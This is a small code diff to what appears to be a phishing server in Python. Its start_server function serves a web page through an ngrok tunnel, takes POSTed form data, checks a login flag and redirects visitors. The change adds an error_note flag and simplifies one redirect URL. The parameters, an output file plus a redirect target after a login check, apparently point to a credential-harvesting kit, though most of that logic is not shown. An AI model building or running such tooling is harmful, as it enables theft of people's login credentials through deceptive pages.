@@ -223,7 +223,7 @@ def start_server(web_site, port, output_file, redirect_location, check_login, ng
                 self.send_error(500, f'Server Error: {e}')
         
         def do_POST(self):
-            global login_check
+            global login_check,error_note
             error_web = error_pages.get(web_site.split(path_separator)[-1].split('.')[0], f"errors_htmls{path_separator}errordef.html")
             try:
                 content_length = int(self.headers['Content-Length'])
@@ -255,9 +255,10 @@ def start_server(web_site, port, output_file, redirect_location, check_login, ng
                     self.send_header('Location', redirect_location)
                     self.end_headers()
                 elif login_check == False and check_trust:
+                    error_note = 1
                     start_server(error_web, port, output_file, redirect_location, check_login, ngrok_token)
                     self.send_response(302)
-                    self.send_header('Location', f"http://{ngrok_url}/{error_web}")
+                    self.send_header('Location', f"http://{ngrok_url}")
                     self.end_headers()
             
             except Exception as e:
